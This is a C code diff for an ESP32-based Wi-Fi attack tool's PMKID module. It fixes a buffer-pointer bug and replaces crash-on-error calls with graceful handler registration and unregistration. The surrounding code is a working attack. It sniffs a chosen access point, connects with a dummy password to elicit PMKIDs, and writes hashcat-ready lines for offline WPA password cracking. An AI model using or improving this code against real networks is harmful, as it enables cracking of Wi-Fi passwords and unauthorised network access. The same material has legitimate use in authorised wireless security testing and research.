@@ -30,6 +30,7 @@
 
 static const char* TAG = "main:attack_pmkid";
 static const wifi_ap_record_t *ap_record = NULL;
+static bool pmkid_handler_registered = false;
 
 static const char *pcap_error_message(void)
 {
@@ -66,7 +67,8 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
         pmkid_item_count++;
     }
 
-    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
+    // Result layout: [0..5] MAC_STA, [6..11] MAC_AP, [12] SSID length,
+    // [13..] SSID, then PMKID * count.
     char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
     if (content == NULL) {
         /* free the list so the items do not leak when allocation failed */
@@ -79,6 +81,9 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
         attack_signal_storage_error("PMKID 结果内存不足");
         return;
     }
+    /* Keep the head of the buffer: `content` is advanced while filling, but the
+       hashcat line below needs the STA MAC stored at the very beginning. */
+    char *const content_head = content;
     wifictl_get_sta_mac((uint8_t *) content);
     content += 6;
     memcpy(content, ap_record->bssid, 6);
@@ -90,7 +95,6 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
 
     // copy PMKIDs into continuous memory into "content" in status, freeing as we go,
     // and build a hashcat-ready line for each one so the result survives a reboot.
-    char *save_ptr = content;
     char hashcat_line[256];
     bool saved = false;
 
@@ -112,7 +116,7 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
                 snprintf(&ap_hex[i * 2], 3, "%02x", ap_record->bssid[i]);
             }
             ap_hex[12] = '\0';
-            const uint8_t *sta = (const uint8_t *) save_ptr;
+            const uint8_t *sta = (const uint8_t *) content_head;
             for (unsigned i = 0; i < 6; i++) {
                 snprintf(&sta_hex[i * 2], 3, "%02x", sta[i]);
             }
@@ -148,13 +152,34 @@ void attack_pmkid_start(attack_config_t *attack_config){
     wifictl_sniffer_start(ap_record->primary);
     frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
     wifictl_sta_connect_to_ap(ap_record, "dummypassword");
-    ESP_ERROR_CHECK(esp_event_handler_register_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
+
+    esp_err_t err = esp_event_handler_register_with(wifictl_sniffer_event_loop(),
+                                                    FRAME_ANALYZER_EVENTS,
+                                                    DATA_FRAME_EVENT_PMKID,
+                                                    &pmkid_exit_condition_handler, NULL);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to register PMKID handler: %s", esp_err_to_name(err));
+        attack_signal_storage_error("PMKID 处理器注册失败");
+        return;
+    }
+    pmkid_handler_registered = true;
 }
 
 void attack_pmkid_stop(){
     wifictl_sta_disconnect();
     wifictl_sniffer_stop();
     frame_analyzer_capture_stop();
-    ESP_ERROR_CHECK(esp_event_handler_unregister_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler));
+    /* Unregistering a handler that is not registered (or already gone) is not
+       fatal: it must never abort() the device while stopping an attack. */
+    if (pmkid_handler_registered) {
+        esp_err_t err = esp_event_handler_unregister_with(wifictl_sniffer_event_loop(),
+                                                         FRAME_ANALYZER_EVENTS,
+                                                         DATA_FRAME_EVENT_PMKID,
+                                                         &pmkid_exit_condition_handler);
+        if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
+            ESP_LOGW(TAG, "Failed to unregister PMKID handler: %s", esp_err_to_name(err));
+        }
+        pmkid_handler_registered = false;
+    }
     ESP_LOGD(TAG, "PMKID attack stopped");
 }
